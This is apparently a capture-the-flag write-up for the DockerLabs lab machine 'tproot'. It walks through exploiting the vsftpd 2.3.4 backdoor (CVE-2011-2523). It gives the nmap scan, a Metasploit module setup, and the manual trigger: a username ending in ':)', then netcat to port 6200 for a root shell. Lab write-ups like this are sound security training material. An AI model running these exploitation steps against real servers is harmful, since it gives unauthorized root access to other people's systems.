# tproot - DockerLabs - Easy

## Summary

**tproot** is an easy Linux machine from DockerLabs that exploits the well-known vsftpd 2.3.4 backdoor vulnerability (CVE-2011-2523). The backdoor is triggered by appending `:)` to the FTP username, which opens a shell on port 6200. The shell spawns directly as root, requiring no privilege escalation.

---

## Tools

- `nmap` — port and service enumeration
- `ftp` — manual backdoor trigger
- `netcat (nc)` — backdoor shell connection
- `metasploit` — attempted automated exploitation (failed due to payload issues)

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- 172.17.0.2
```

Open ports:
- **21** — FTP (vsftpd 2.3.4)
- **80** — HTTP (Apache 2.4.58 on Ubuntu — default page, nothing useful)

### Key Finding

vsftpd **2.3.4** is a famously backdoored version. The backdoor was intentionally introduced into the source code in 2011 and triggers when `:)` is appended to the FTP username, opening a shell on port **6200**.

---

## 2. Exploitation

### Metasploit Attempt (failed)

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
run
```

The backdoor was spawned but no session was created due to payload delivery issues.

### Manual Exploitation

The backdoor is triggered by sending a username containing `:)` to the FTP service:

```bash
ftp 172.17.0.2
# Name: test:)
# Password: <anything>
```

This causes vsftpd to open a shell listener on port **6200**. Connect with netcat:

```bash
nc 172.17.0.2 6200
```

Shell obtained directly as **root** — no privilege escalation needed.

```bash
whoami
# root
```

---

## 3. Escalate Privileges

Not required — the backdoor shell spawns as `root`.

---

## 4. Lessons Learned

1. **Always check service versions** — vsftpd 2.3.4 is a well-known CVE; version detection alone reveals the attack vector.
2. **Automated tools don't always work** — Metasploit failed due to payload issues; manual exploitation was faster and more reliable.
3. **The vsftpd 2.3.4 backdoor mechanism** — the `:)` smiley in the username triggers the backdoor via a crafted FTP request, opening a bind shell on port 6200.
4. **Default web pages give nothing** — when HTTP only shows the Apache default page and directory enumeration finds nothing, pivot to other services immediately.
